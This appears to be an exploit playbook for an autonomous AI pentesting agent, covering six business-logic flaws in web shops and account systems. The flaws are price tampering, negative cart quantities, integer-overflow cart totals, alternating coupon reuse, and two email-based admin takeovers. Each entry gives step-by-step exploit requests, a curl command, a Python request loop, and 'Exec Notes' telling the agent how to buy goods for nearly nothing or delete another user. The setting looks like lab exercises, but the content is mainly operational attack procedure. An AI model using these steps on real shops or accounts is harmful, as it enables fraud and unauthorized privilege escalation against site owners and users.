# Business Logic Flaws (BLF) — Web Security Attack Reference

Coverage: 11 BLF vulnerability patterns

## BLF-01: Excessive Trust in Client-Side Controls (Price Tampering)
**Pattern:** BLF-01

### Vulnerability
The server accepts a `price` parameter in the `POST /cart` request body submitted by the client and uses it directly to set the item price in the cart, without validating it against the canonical price stored server-side in the product catalog or database. Any attacker who intercepts and modifies the HTTP request (trivially done with a proxy) can purchase any item for an arbitrary price, including $0.01. Root cause: the developer assumed the price would only arrive from the web UI, which renders the correct value — they did not account for the fact that the HTTP request itself can be tampered before it reaches the server. No HMAC, signature, or integrity token protects the price field.

### Signals (detectable from recon)
- POST /cart (or /basket, /order) body contains a `price` field as a plain integer alongside `productId` and `quantity` — price is client-supplied rather than server-derived from productId alone.
- No integrity/signature field (price_sig, price_token, price_hmac) accompanies the price parameter.
- After sending a tampered price, GET /cart response reflects the modified value in the cart total — server stores and uses the submitted price verbatim.
- No HTTP 4xx error or rejection message is returned when an implausible price (e.g., 1 cent for a high-value item) is submitted.
- The web UI presents a fixed price to the user, but that fixed value is transmitted back to the server in the request body rather than being looked up server-side by productId at checkout time.

### Discovery Steps (before attacking)
1. Crawl the application and collect all POST requests to cart/order endpoints (e.g., POST /cart, POST /basket, POST /order). Flag any request whose body contains a parameter matching: price, unitPrice, cost, amount, total, itemPrice, lineTotal.
2. For each flagged request, check whether the price-like parameter appears alongside productId (or itemId, sku, etc.) and quantity. If price is submitted by the client rather than derived purely from a server-side productId lookup, mark the endpoint as suspicious.
3. Check for the absence of an integrity/signature field accompanying the price parameter. If there is no price_sig, price_token, price_hmac, or similar field, the value is likely unprotected.
4. Send a modified version of the POST /cart request with price=1 (or price=100 if the application uses cent notation). Follow up with GET /cart and parse the displayed price. If the cart total reflects the tampered value, the vulnerability is confirmed.
5. To discover valid productIds for the target item: crawl product listing pages (e.g., GET /), parse HTML for links containing ?productId=, or inspect the POST /cart request captured during a normal add-to-cart action — the productId is already present in the body.

### Exploit Steps
1. Log in with actual target credentials from Known-Good Values (or the application's test credentials). Navigate to the product listing and add the target item (e.g., 'Lightweight l33t leather jacket') to the cart to capture a baseline POST /cart request in Burp Proxy HTTP history.
2. In the captured POST /cart request, identify the body parameters: productId=<id>&quantity=1&price=<value>. Note the original price value (e.g., price=133700 for a $1337.00 item in cent notation).
3. Send the POST /cart request to Burp Repeater (or replay with curl). Modify the price parameter to an integer less than the available store credit, e.g., price=1 (1 cent) or price=100 ($1.00). Example curl: curl -s -b 'session=<token>' -X POST https://<target-host>/cart -d 'productId=1&quantity=1&price=1'
4. Send the modified request. Then fetch GET /cart and verify the cart displays the tampered price for the item. If the displayed total matches the submitted value, the server is accepting the client-controlled price.
5. Set price to any integer strictly less than the store credit balance shown in the account (e.g., if credit is $100.00, set price=9900 for $99.00, or price=1 for $0.01). Send the POST /cart request with this price.
6. Proceed to checkout: submit POST /cart/checkout with the session cookie and CSRF token. If the order completes successfully (HTTP 302 redirect to order confirmation, or 200 with order confirmation message), the exploit succeeded.
7. Confirm exploitation is confirmed by checking the response body for a success message (e.g., 'the action/order was completed successfully') or by observing that the store credit has been deducted by the tampered amount rather than the real price.

### Key Field Names
- `price`
- `unitPrice`
- `cost`
- `amount`
- `total`
- `itemPrice`
- `lineTotal`
- `productId`
- `quantity`
- `price_sig`
- `price_token`
- `price_hmac`

### Proof of Exploitation
After sending POST /cart with price=1 (or any value less than store credit), GET /cart returns a cart total that reflects the tampered price rather than the real product price. Completing POST /cart/checkout returns an order confirmation response (HTTP 200 or 302 to a confirmation page) with the order recorded at the attacker-controlled price. The application success indicator displays 'the action/order was completed successfully'. Concrete signal: cart JSON or HTML shows the line item price equal to the value submitted in the tampered request, not the catalog price.

### Exec Notes
The exec agent must perform three phases in order. Phase 1 (discovery): crawl the product listing page to extract a valid productId for the target item — parse anchor tags or form actions containing productId. Phase 2 (tamper and verify): replay POST /cart with price=1; fetch GET /cart; assert the cart total is 1 (or near 1) rather than the catalog price — this is the gate check before proceeding. Phase 3 (exploit): replay POST /cart with price set to an integer strictly less than the store credit shown in the account page; then POST /cart/checkout with the current session cookie and any CSRF token scraped from the cart page. Assert the response contains an order confirmation string. The price parameter uses integer cent notation (e.g., price=100 means $1.00), so set price=1 to minimize spend and stay well under any credit limit. The CSRF token must be scraped fresh from GET /cart immediately before POSTing to /cart/checkout, as it changes per session.

---

## High-Level Logic Vulnerability: Negative Quantity Cart Manipulation
**Pattern:** BLF-02

### Vulnerability
The POST /cart endpoint accepts a client-controlled signed integer for the quantity parameter with no server-side lower-bound validation. The server correctly enforces product prices via server-side lookup (productId maps to price; price is never in the request), but it applies the client-supplied quantity as an unrestricted delta. Checkout computes the cart total arithmetically as sum(price_i * quantity_i). Because no per-line-item floor of quantity >= 1 is enforced, a negative quantity creates a negative line-item value that offsets positive line items. An attacker adds the target expensive item at quantity=1 and adds a cheap item at a sufficiently large negative quantity so that the aggregate cart total falls within the attacker's store credit. The only defense is a client-side HTML/JS minimum constraint on the quantity input field, which is trivially bypassed via an intercepting proxy or direct HTTP request. The checkout endpoint accepts any cart total >= $0.00 regardless of how that total was constructed.

### Signals (detectable from recon)
- POST /cart request body contains productId and quantity but NOT price — price is absent from the client request, meaning only quantity remains as a client-controlled numeric attack surface.
- quantity parameter is a raw integer in application/x-www-form-urlencoded body with no HMAC, no session-bound token, and no server-visible type constraint.
- The cart UI exposes separate increment (+) and decrement (-) actions that map to quantity=+1 and quantity=-1 POST /cart requests — the server processes a signed delta, not an absolute set-to value, making sign manipulation natural.
- Client-side HTML form has min='1' attribute or equivalent JS validation on quantity input, but no corresponding server-side rejection of negative values (confirmed when quantity=-1 returns HTTP 200/302 with updated cart state).
- GET /cart after sending quantity=-N with an empty cart shows -N units and a negative subtotal for that line item — the server has no inventory floor check.
- Checkout POST /cart/checkout succeeds (HTTP 302 to order confirmation) when cart total is >= $0.01 and <= store credit, regardless of the sign of individual line items.
- Price is NOT tamper-able (no price field in POST /cart) — this partial server-side trust model is the BLF-02 fingerprint: price integrity is enforced but quantity integrity is not.

### Discovery Steps (before attacking)
1. GET / — parse all anchor href values matching pattern /product?productId=\d+ to enumerate product IDs and names. Record productId, product name, and displayed price for each.
2. GET /product?productId=N for each N — parse the page for the exact unit price displayed (e.g., '$8.29'). Store as a float for arithmetic. Identify which productId corresponds to 'Lightweight l33t leather jacket'.
3. GET /my-account — parse for store credit balance. Look for text matching patterns like 'Store credit: $N' or 'Your balance: $N'. This is the CREDIT ceiling for the exploit.
4. POST /cart with productId=<any>&quantity=1&redir=PRODUCT — observe the request structure in the response. Confirm the request body uses application/x-www-form-urlencoded with exactly the fields: productId, quantity, redir.
5. POST /cart with productId=<cheap_id>&quantity=-1&redir=CART — if HTTP response is 2xx or 3xx and GET /cart reflects -1 quantity, the server accepts negative quantities. This is the go/no-go signal for BLF-02.
6. GET /cart — parse for the CSRF token in the checkout form: look for <input type='hidden' name='csrf' value='...'> or equivalent. This token is required for POST /cart/checkout.
7. Confirm checkout endpoint: inspect the cart page form action attribute or known path /cart/checkout. Verify it accepts POST with body csrf=<token>.

### Exploit Steps
1. Authenticate: POST /login with username=<ATTACKER_USER>&password=<ATTACKER_PASS>. Extract and store the session cookie from the Set-Cookie response header.
2. Enumerate products: GET /. Parse the HTML response to extract all product links (href values matching /product?productId=N). Record each productId and its displayed price. Identify the target item (Lightweight l33t leather jacket) and its productId (typically productId=1, price ~$1337.00). Identify the cheapest available item and its productId and unit price.
3. Check store credit: GET /my-account. Parse the response body for the current store credit balance (displayed as 'Your store credit: $100.00' or similar). Record this as CREDIT.
4. Add target item to cart: POST /cart with body productId=<jacket_id>&quantity=1&redir=PRODUCT. Expect HTTP 302 redirect. Verify cart via GET /cart — confirm jacket appears at full price.
5. Probe negative quantity acceptance: POST /cart with body productId=<cheap_item_id>&quantity=-1&redir=CART. Confirm HTTP 200 (or 302) response and that GET /cart shows -1 units of the cheap item with a negative subtotal. This confirms the server accepts negative integers.
6. Calculate required negative quantity: Let P_cheap = unit price of cheap item. Let P_jacket = jacket price. Solve for N: P_jacket + (P_cheap * -N) <= CREDIT and P_jacket + (P_cheap * -N) >= 0.01. Compute N = ceil((P_jacket - CREDIT) / P_cheap). For example values (jacket=$1337.00, credit=$100.00, cheap item=$8.29): N = ceil((1337.00 - 100.00) / 8.29) = ceil(149.22) = 150 units, giving total = 1337.00 - (8.29 * 150) = 1337.00 - 1243.50 = $93.50 which is <= $100.00 and > $0.00.
7. Remove any existing cheap item units from cart first (if probe step left -1 in cart): POST /cart with body productId=<cheap_item_id>&quantity=1&redir=CART to zero it out, or account for existing quantity in the calculation.
8. Apply the exploit negative quantity: POST /cart with body productId=<cheap_item_id>&quantity=-<N>&redir=CART (e.g., quantity=-150). Confirm via GET /cart that the cart total is now between $0.01 and $100.00.
9. Extract CSRF token: GET /cart. Parse the HTML response body for the hidden input field named 'csrf' inside the checkout form. Record its value.
10. Place order: POST /cart/checkout with body csrf=<token>. Expect HTTP 302 redirect to /order-confirmation or equivalent success page.
11. Verify exploitation: Follow the redirect. GET /order-confirmation (or the redirect target). Confirm the response body contains order confirmation text and that the application response indicates 'the action/order was completed successfully'.

### Key Field Names
- `productId`
- `quantity`
- `redir`
- `csrf`

### Proof of Exploitation
POST /cart/checkout returns HTTP 302 with Location header pointing to /order-confirmation (or equivalent). Following the redirect, the response body contains an order confirmation message and the order includes the 'Lightweight l33t leather jacket'. The application success banner changes to 'the action/order was completed successfully'. The cart total at time of checkout was >= $0.01 and <= $100.00 (store credit), achieved by combining jacket at quantity=1 with a cheap item at a large negative quantity computed as ceil((jacket_price - store_credit) / cheap_item_price).

### Exec Notes
The agent must handle two arithmetic edge cases: (1) the total must be strictly >= $0.01 — a fully negative or zero total is rejected at checkout with an error, so N must not be so large that the total goes below zero; (2) if the cheap item chosen has a unit price very close to the jacket price divided by credit, floating point rounding can push the total slightly above $100.00 — recompute with N+1 and verify the new total is still > $0. The redir parameter value (PRODUCT vs CART) does not affect server-side behavior for this exploit — either value works. If POST /cart/checkout returns HTTP 200 instead of 302, parse the response body for an error message (e.g., 'Your order total exceeds your store credit') and recalculate N. The CSRF token must be freshly extracted from GET /cart immediately before POST /cart/checkout — do not reuse a token from an earlier GET.

---

## BLF-08: Integer Overflow / Signed Arithmetic Wrap (Low-Level Logic Flaw)
**Pattern:** BLF-08

### Vulnerability
The server stores the running cart total as a signed 32-bit integer in cents. No server-side maximum is enforced on the cumulative cart quantity — only per-request quantity is validated (max 2 digits, i.e., max 99 per request). By sending repeated POST /cart requests with quantity=99, the attacker accumulates the price total until it exceeds INT32_MAX (2,147,483,647), causing it to wrap around to a large negative number (INT32_MIN = -2,147,483,648). By controlling the exact number of iterations, the attacker engineers the final cart total to land between $0 and their available store credit. Checkout succeeds because the server sees a small positive total, delivering the expensive item at near-zero cost. The flaw is purely in server-side arithmetic — no client-side tampering of price or quantity values is required; all submitted quantities are individually valid.

### Signals (detectable from recon)
- POST /cart accepts quantity up to 99 per request (2-digit cap enforced per request) but returns 2xx for repeated calls — no cumulative cap
- Cart total is stored and displayed as an integer (whole cents, e.g. $1337.00 not $1337.something_arbitrary_precision) — sign of 32-bit integer storage
- No 400/422 error after adding the same item repeatedly with qty=99 across many requests
- Cart total visibly drops to a large negative number after ~160-163 loop iterations (direct runtime observable signal via GET /cart)
- Per-request validation exists (quantity > 99 is rejected) but no server-side total-quantity-per-order limit is enforced
- High unit price ($1337.00) means fewer loop iterations are needed compared to cheap items — accelerates overflow signal detection
- Available store credit is capped at $100.00, well below the item price, confirming normal purchase is impossible and overflow is the only viable path

### Discovery Steps (before attacking)
1. Crawl: capture all POST endpoints with a quantity or qty parameter in the request body. Flag endpoints that accept numeric quantity without a hard server-side maximum (no 422 at qty=99 after multiple calls).
2. Price type check: GET /cart after adding an item; parse the total field. If it is returned as an integer or has no fractional precision (e.g. rendered as $1337.00 without arbitrary decimal handling), suspect 32-bit int storage.
3. Overflow math: price_cents * 99 * N_requests > 2147483647. For $1337.00: 133700 * 99 = 13,236,300 cents per request; ceil(2147483647 / 13236300) = 163 requests. If this number is reachable with an automated loop (no rate-limit blocks), the vulnerability is exploitable.
4. No-limit probe: send POST /cart with quantity=99 ten times in quick succession. If all return 2xx and the cart total keeps growing, there is no server-side cumulative cap — BLF-08 is confirmed viable.
5. Filler item identification: GET /catalog or parse the product listing page to find at least one cheap item (low unit price, small productId). The filler is used in the total-adjustment step to nudge the negative total into [$0, $100].

### Exploit Steps
1. DISCOVERY: Log in as the attacker test account credentials. Navigate to the product listing and identify the target item (Lightweight l33t leather jacket). Capture its productId from the POST /cart request body or from the product page HTML (look for <input name='productId' value='N'> or a form action). Record the price from the product page — $1337.00 = 133700 cents.
2. DISCOVERY: Attempt a normal checkout to confirm available store credit ($100.00 = 10000 cents). Note the credit amount from the cart/account page. Identify a cheap filler product (productId != target) and its per-unit price in cents.
3. SIGNAL TEST: Send POST /cart with productId=<target_id>&quantity=99&redir=PRODUCT (or the path shown in the captured request). Confirm the server returns 2xx and the cart total increases by 99 * 133700 = 13,236,300 cents. No 4xx means per-request cap is 99 but there is no cumulative cap — BLF-08 is viable.
4. OVERFLOW LOOP (exec script): Calculate first overflow point: ceil(INT32_MAX / (target_price_cents * 99)). The exact number of requests depends on the target item price — compute it from the price you discovered in step 1. Use a Python script via shell_execute to send the loop: import requests; s = requests.Session(); s.cookies.set('session', SESSION_COOKIE); [s.post(TARGET+'/cart', data={'productId': PRODUCT_ID, 'quantity': '99', 'redir': 'PRODUCT_PATH'}) for _ in range(COMPUTED_N)]. Set sequential execution (no concurrency) to ensure predictable price increments.
5. FINE-TUNE: After sufficient loop iterations (compute: ceil((2 * INT32_MAX) / (target_price_cents * 99)) to ensure the total has wrapped past zero into positive territory, then adjust with a final partial request), GET /cart and parse the displayed total — it should be a large negative value or a small positive value close to zero.
6. TOTAL ADJUSTMENT: The cart total is now large-negative. Add a cheap filler item (a different productId) with a quantity large enough to bring the running total into the range [1 cent, 10000 cents]. Formula: units_needed = ceil(abs(current_total_cents) / filler_price_cents) + small_buffer. Send POST /cart with productId=<filler_id>&quantity=<units_needed>. Re-check GET /cart after each add until total is between $0.01 and $100.00.
7. CHECKOUT: With cart total in range [$0.01, $100.00], send POST /cart/checkout (include CSRF token from the cart page). The server accepts the order because the total is within the user's credit. Confirm on the order confirmation page that the Lightweight l33t leather jacket appears in the order.

### Key Field Names
- `productId`
- `quantity`
- `redir`
- `csrf`
- `session (cookie)`

### Proof of Exploitation
Exploitation is proven when: (1) POST /cart/checkout returns 200 or 302-to-confirmation, AND (2) GET /cart/order-confirmation (or the redirected confirmation page) contains the text 'Lightweight l33t leather jacket' (or the target item name) in the order summary. The ProofGate fires on QUANTITY_TAMPER + STATE_DELTA: the anomalous numeric field (cart total < 0 observed in a GET /cart response, or a large positive quantity accepted across multiple sequential calls) satisfies QUANTITY_TAMPER; the order confirmation appearing in the final exchange satisfies STATE_DELTA (order state transitioned from pending to confirmed). The key concrete marker is the cart total wrapping to a negative value (e.g. -$1221.96) visible in an intermediate GET /cart response, followed by a successful checkout at a total between $0.01 and $100.00.

### Exec Notes
The exec agent must NOT call http_request many large-quantity requests individually — that would exhaust the tool-call budget. Instead, use shell_execute with a Python requests loop. Template:\n\nimport requests\ns = requests.Session()\ns.cookies.set('session', '<SESSION_COOKIE_HERE>')\ntarget = 'https://<TARGET_HOST>'\nproduct_id = '<TARGET_PRODUCT_ID>'\nproduct_path = '/product?productId=' + product_id\nfor i in range(COMPUTED_N):\n    r = s.post(target + '/cart', data={'productId': product_id, 'quantity': '99', 'redir': product_path})\n    if r.status_code != 200:\n        print(f'[WARN] iteration {i}: status {r.status_code}')\nprint('Loop done')\n\nAfter the loop, send one additional POST /cart with a small quantity via a direct http_request call to fine-tune the total, then GET /cart to read the current total. Parse the dollar amount from the HTML (look for the pattern $-NNN.NN or a negative number in the cart total cell). The filler-item adjustment step uses the same POST /cart structure with a different productId and a computed quantity. Checkout is POST /cart/checkout with the CSRF token extracted from the cart page form.

---

## BLF-11: Inconsistent Security Controls via Email Domain Bypass
**Pattern:** BLF-11

### Vulnerability
The application grants access to privileged endpoints (e.g., /admin) based on the email domain stored in the authenticated user's account record. The domain check is enforced at registration (only verified domains can receive the confirmation email), but is never re-enforced when the user later changes their email address. Because the post-login email-change form accepts arbitrary domains without re-verification, any authenticated user can self-escalate by writing a privileged domain (e.g., @dontwannacry.com) into their own account record. The privilege check reads live from mutable account data, but that data is freely user-controlled after initial account creation.

### Signals (detectable from recon)
- GET /admin returns HTTP 403 and the response body contains a named email domain or group (e.g., 'DontWannaCry users') — leaking the exact domain required for access
- Registration page response body contains text matching: /(company|employee|staff|corporate) email/i or /use your .* email address/i — confirming domain is an access criterion
- Authenticated account-settings page exposes an email change form (POST /my-account/change-email or similar) with no HTML `pattern` attribute restricting the domain and no CSRF-only protection
- After changing email to the privileged domain, the authenticated page DOM gains a new navbar link pointing to /admin or /staff — confirming the privilege check reads live from account email field
- Changing email to the privileged domain triggers no confirmation email, no redirect to a verification-pending page, and no 4xx response — indicating server-side absence of re-verification
- Content discovery (forced browsing wordlist) finds /admin returning 403 with a domain hint in the body rather than 404

### Discovery Steps (before attacking)
1. Send GET /admin. If response is 403, extract the response body and search for a domain name using regex: /([a-zA-Z0-9.-]+\.com)/g on sentences containing 'users', 'employees', 'members', 'staff'. The matched domain is the privileged email domain (TARGET_DOMAIN).
2. Send GET /register. Search the response body for text matching /(company|employee|corporate|staff|DontWannaCry)/i to confirm domain-based registration hint. This corroborates TARGET_DOMAIN.
3. Identify the attacker-controlled inbox domain. This may be a mail server subdomain you control, an intercepting SMTP listener, or a disposable inbox service. Record the deliverable domain as INBOX_DOMAIN.
4. Register a new account: POST /register with body username=autotest1&email=autotest1@INBOX_DOMAIN&password=autopass123&csrf=<token>. Expect HTTP 200 or redirect to a pending-verification page.
5. Poll GET /email (or the email client endpoint) for the confirmation link. Extract the href from the first anchor tag in the confirmation email. Send GET <confirmation_link>. Expect HTTP 200 or redirect to login.
6. Log in: POST /login with username=autotest1&password=autopass123&csrf=<token>. Capture the session cookie.
7. Send GET /my-account (authenticated). Locate the email update form: find the <form> element whose action contains 'change-email' or 'update-email'. Record the exact action path and the name attribute of the email input field.
8. Confirm that the email input field has no `pattern` attribute or `type=email` domain restriction that would block arbitrary domains at the client layer (irrelevant server-side, but confirms intent).

### Exploit Steps
1. Read the CSRF token from GET /my-account response: extract value of input[name='csrf'] or input[name='_csrf'] within the email-change form.
2. Send POST /my-account/change-email with body: email=attacker@TARGET_DOMAIN&csrf=<token>. Use the exact field name discovered in discovery step 7. Expect HTTP 200 or redirect back to /my-account with no error.
3. Send GET /my-account (authenticated). Verify the displayed email now shows attacker@TARGET_DOMAIN. If the page still shows the old email, the server rejected the change — check for a CSRF mismatch or additional hidden fields.
4. Send GET /admin (authenticated, same session). Expect HTTP 200. If still 403, the privilege check may be session-cached — log out and log back in, then retry GET /admin.
5. Send GET /admin/delete?username=<VICTIM_USER> (authenticated). Expect HTTP 302 redirect or HTTP 200 confirming deletion. If the endpoint requires a POST, send POST /admin/delete with body username=<VICTIM_USER>&csrf=<token>.

### Key Field Names
- `email — POST body field in /register; initial value must be a deliverable address on the attacker-controlled domain to receive confirmation link`
- `email — POST body field in /my-account/change-email (or equivalent update-email endpoint); this is the tamper target; set to attacker@dontwannacry.com`
- `username — POST body field in /register; arbitrary value`
- `password — POST body field in /register and /login; arbitrary value`
- `csrf — POST body CSRF token; must be read from the current page's hidden input before each state-changing POST`
- `username — query parameter in /admin/delete?username=<VICTIM_USER>; used to trigger the final privileged action`

### Proof of Exploitation
["GET /admin returns HTTP 200 (not 403) after the email change — proves domain-gated access was bypassed.", "GET /admin response body no longer contains the 'access denied' message; instead it renders admin UI content (user list, delete links, etc.).", "GET /admin/delete?username=<VICTIM_USER> (or POST equivalent) returns HTTP 302 to /admin or HTTP 200, and a subsequent GET /admin no longer lists '<VICTIM_USER>' in the user table — proves the privileged destructive action was executed.", "Optional confirmation: GET /my-account shows email=attacker@dontwannacry.com, directly showing the mutable account field that elevated privilege."]

### Exec Notes
The exec agent must handle three distinct session states: (1) unauthenticated registration flow with email confirmation polling, (2) authenticated pre-escalation state to discover the email-change form and read its exact field names and CSRF token, (3) authenticated post-escalation state to access /admin and delete <VICTIM_USER>. CSRF tokens must be re-read from the page immediately before each state-changing POST — never reuse a token across requests. The email client polling loop should retry up to 10 times with 2-second intervals before failing. The TARGET_DOMAIN must be extracted dynamically from the /admin 403 response body, not hardcoded, to handle variations across application instances. If /admin/delete requires a POST (some application variants), the agent must read the delete form's action and method from the /admin page DOM before issuing the delete request.

---

## Flawed Enforcement of Business Rules (Alternating Coupons)
**Pattern:** BLF-05: Coupon last-used-only deduplication bypass via alternating valid codes

### Vulnerability
The coupon validation logic stores only the most recently applied coupon code (a single scalar field, not a set) and rejects a new submission only if it matches that last-used value. It does not maintain a per-order set of already-used codes and enforces no global one-time-use constraint. By alternating between two independently valid coupon codes, an attacker trivially bypasses the consecutive-duplicate check on every request, applying each code an unbounded number of times. Each successful application reduces the cart total, allowing the full price of any item to be erased before checkout.

### Signals (detectable from recon)
- Two coupon codes obtainable via distinct channels: one rendered in page HTML (NEWCUST5), one delivered via a secondary user action (newsletter signup → SIGNUP30). Presence of two separate acquisition paths is the primary static signal.
- POST /cart/coupon endpoint exists and returns HTTP 200 with a body mutation (cart total decreases) — confirms server-side price state is mutable per coupon POST.
- Applying the same coupon code twice consecutively returns a rejection (error string in 200 body, e.g. 'You have already applied this coupon'). This confirms a deduplication check exists but reveals its scope is limited to the last-used value.
- After sequence code_A → code_B, reapplying code_A returns success and the cart total decreases again. This is the definitive BLF-05 signal: acceptance of a previously used code after one intervening different code.
- No floor on cart total (total can reach $0 or below $1) — no minimum-order-value guard is enforced server-side.
- No 'maximum number of coupons per order' HTTP error after N applications — server never returns a 4xx rejecting on count.

### Discovery Steps (before attacking)
1. GET / — scrape all visible text for coupon codes (regex: [A-Z0-9]{5,20}). NEWCUST5 is present in the page body.
2. Identify newsletter/referral signup forms: scan all <form> elements and anchor hrefs in the page for keywords 'newsletter', 'subscribe', 'sign-up', 'signup'. Submit the form (POST /sign-up with a valid email) and capture the response or follow-up email text for a second coupon code (SIGNUP30).
3. Identify the add-to-cart endpoint: look for POST forms or JS fetch calls targeting /cart. Required parameters are productId (integer) and quantity (integer). productId for the target item ('Lightweight l33t leather jacket') is discoverable from the product detail page URL or the form's hidden input.
4. Identify the coupon endpoint: look for a <form> or JS POST handler on the cart/checkout page with a field named 'coupon'. The action attribute or fetch URL is the coupon endpoint (canonically POST /cart/coupon).
5. Confirm the CSRF token field name: inspect the coupon form for a hidden input whose name matches 'csrf' or '_csrf'. Extract its current value before each POST.
6. Confirm the checkout endpoint: locate the final order-submit form on the cart page, typically POST /cart/checkout with a csrf field.

### Exploit Steps
1. POST /login — body: username=<ATTACKER_USER>&password=<ATTACKER_PASS>. Assert HTTP 302 redirect to /my-account or equivalent. Store session cookie.
2. GET / — extract coupon code NEWCUST5 from page body using regex [A-Z0-9]{5,20} near the word 'coupon'.
3. POST /sign-up (or the newsletter form action URL) — body: email=<any valid address>. Extract coupon code SIGNUP30 from the response body or confirmation text.
4. POST /cart — body: productId=1&quantity=1&redir=PRODUCT. Assert HTTP 302 or 200. Verify cart now contains the jacket.
5. GET /cart — parse the current order total from the response body. Extract a fresh CSRF token value from the coupon form hidden input.
6. POST /cart/coupon — body: csrf=<token>&coupon=NEWCUST5. Assert 200 and that the response body contains a success message (e.g., 'Coupon applied'). Record new total T1.
7. GET /cart — extract a fresh CSRF token.
8. POST /cart/coupon — body: csrf=<token>&coupon=SIGNUP30. Assert success. Record new total T2. Confirm T2 < T1.
9. Loop — on each iteration: (a) GET /cart, extract fresh CSRF token and current total; (b) POST /cart/coupon with coupon=NEWCUST5; (c) GET /cart, extract fresh CSRF token and current total; (d) POST /cart/coupon with coupon=SIGNUP30; (e) after each POST confirm total decreased; (f) exit loop when total <= 100 (store credit threshold).
10. POST /cart/checkout — body: csrf=<fresh token>. Assert HTTP 302 to order confirmation page or 200 with 'order confirmed' text. Exploitation is confirmed when the order is accepted and the target item appears in the order confirmation.

### Key Field Names
- `coupon`
- `csrf`
- `productId`
- `quantity`
- `redir`
- `username`
- `password`

### Proof of Exploitation
After the alternation loop completes, the cart total visible in GET /cart response is <= $100.00 (store credit). POST /cart/checkout returns either HTTP 302 to an order-confirmation URL or HTTP 200 containing the string 'Your order has been placed' (or equivalent). The application success banner ('the action/order was completed successfully') appears in the HTML of the page loaded after checkout. Additionally, the order history or confirmation page lists the 'Lightweight l33t leather jacket' as purchased at a heavily discounted or zero price, confirming the repeated coupon application was accepted by the server through the full transaction lifecycle.

### Exec Notes
The loop termination condition must be based on parsed cart total from the GET /cart response body, not on a fixed iteration count, because the number of alternations required depends on the jacket's current price relative to $100. Parse the total from the HTML (look for a currency-formatted string near 'Total' in the cart table). A fresh CSRF token must be extracted from the coupon form on each GET /cart before every POST /cart/coupon — the token rotates per request. If a POST /cart/coupon returns an error body (e.g., 'Invalid coupon' or the rejection string) on an alternated code, the exploit has failed and the agent should abort rather than loop infinitely. The newsletter signup POST may require only an email field; any syntactically valid email address suffices — no confirmation link click is needed, the coupon appears directly in the POST response or the subsequent page load.

---

## Inconsistent Handling of Exceptional Input (Email Truncation)
**Pattern:** BLF-11

### Vulnerability
The registration pipeline processes the email field inconsistently across two distinct stages: the email delivery subsystem uses the full untruncated address to route confirmation messages, while the database storage layer silently truncates the email to 255 characters before persisting. The access control check for privileged endpoints reads from the database (the truncated value). By crafting an email address where the target privileged domain (e.g., @dontwannacry.com) lands exactly at the truncation boundary, an attacker receives the confirmation link at their real mail server (via the suffix appended beyond character 255) while the stored identity resolves to the privileged domain. No single layer is individually broken; the vulnerability arises purely from inconsistency between pipeline stages. Silent truncation with no error or warning to the user is the root enabler.

### Signals (detectable from recon)
- GET /admin response body contains a named domain restriction (e.g., 'restricted to DontWannaCry employees' or '@dontwannacry.com') — confirms domain-suffix access control predicate
- GET /register HTML: email input has no max-length attribute or max-length > 255 — confirms oversized input is accepted client-side
- GET /register page text references corporate email usage for employees — reveals the domain that unlocks privileged access
- POST /register with 300-char email succeeds with HTTP 200/302 (no validation error) — confirms server-side accepts oversized email
- GET /my-account after confirming long-email account: stored email length is less than submitted length — confirms silent server-side truncation
- Stored email truncated to exactly 255 characters — confirms the specific truncation boundary for payload math
- Confirmation email delivered to full oversized address (mail client receives it) while stored value is truncated — proves split delivery-vs-storage behavior

### Discovery Steps (before attacking)
1. Run content/path discovery (e.g., Burp 'Discover content' or forced browsing wordlist) against the target domain to enumerate all paths. Target: identify any path that returns a domain-restricted access message.
2. Send GET /admin (unauthenticated). Inspect the response body for a string that names a specific email domain (e.g., 'DontWannaCry', '@dontwannacry.com', 'company employees'). If found, record the required domain — this is the access control predicate.
3. Load GET /register. Inspect the HTML for: (a) any max-length attribute on the email input field, (b) any instructional text about corporate email addresses. Absence of a max-length cap or a cap above 255 is a positive signal.
4. Submit a POST /register with a 300-character email address (e.g., 'a' * 292 + '@attacker.mail-server.net'). Use a real deliverable address so the confirmation link arrives. Click the confirmation link.
5. After confirming, send GET /my-account. Extract the stored email value from the response. Compare its length to the submitted length. If stored_length < submitted_length, truncation is confirmed. Record the exact truncation boundary (typically 255 or 254).
6. Verify split behavior: the confirmation email was delivered to the full address (delivery did not truncate), but /my-account shows the shorter stored value. This confirms the two-layer inconsistency is exploitable.

### Exploit Steps
1. Confirm you have a deliverable attacker-controlled inbox at INBOX_DOMAIN (from discovery). This is required so confirmation emails route to you during registration.
2. Determine the truncation boundary T from the discovery probe (expected: T = 255).
3. Determine the target privileged domain D from the /admin restriction message (e.g., 'dontwannacry.com').
4. Compute padding length: padding_len = T - len('@' + D). For T=255 and D='dontwannacry.com' (16 chars): padding_len = 255 - 17 = 238.
5. Construct the exploit email: ('a' * padding_len) + '@' + D + '.' + INBOX_DOMAIN. Total length before truncation exceeds T; truncation at char T leaves exactly ('a'*padding_len + '@' + D) stored.
6. POST /register with the following body parameters: email=<exploit_email>, username=<any_new_username>, password=<any_password>. No special headers required.
7. Retrieve the confirmation link from the application email client (it arrives because delivery uses the full untruncated address). Send GET <confirmation_link> (token URL parameter, e.g., ?token=<uuid>).
8. POST /login with username=<chosen_username> and password=<chosen_password>.
9. Send GET /my-account. Confirm the displayed email is exactly ('a'*238 + '@dontwannacry.com') — 255 characters ending at the target domain. This is proof the truncated identity is stored.
10. Send GET /admin. Confirm the response is the admin panel (not an access-denied message). The domain check reads the stored truncated value, sees @dontwannacry.com, and grants access.
11. Send GET /admin/delete?username=<VICTIM_USER> (or POST with body username=<VICTIM_USER>, depending on application form method). Confirm <VICTIM_USER> is deleted.

### Key Field Names
- `email (POST /register body parameter — target of length manipulation)`
- `username (POST /register body parameter — choose any unique value)`
- `password (POST /register body parameter — choose any value)`
- `token (GET confirmation link URL parameter — received in email, do not modify)`
- `username (POST /login body parameter)`
- `password (POST /login body parameter)`
- `username (GET or POST /admin/delete query/body parameter — value must be '<VICTIM_USER>')`

### Proof of Exploitation
After logging in with the crafted account: (1) GET /my-account response body contains the stored email value equal to ('a'*238 + '@dontwannacry.com'), length exactly 255, confirming truncated identity. (2) GET /admin returns HTTP 200 with admin panel HTML (not a redirect or access-denied body). (3) After sending the delete request for <VICTIM_USER>, GET /admin (or GET /admin/users) no longer lists '<VICTIM_USER>' in the user table, and/or the application success indicator changes to "the action/order was completed successfully"

### Exec Notes
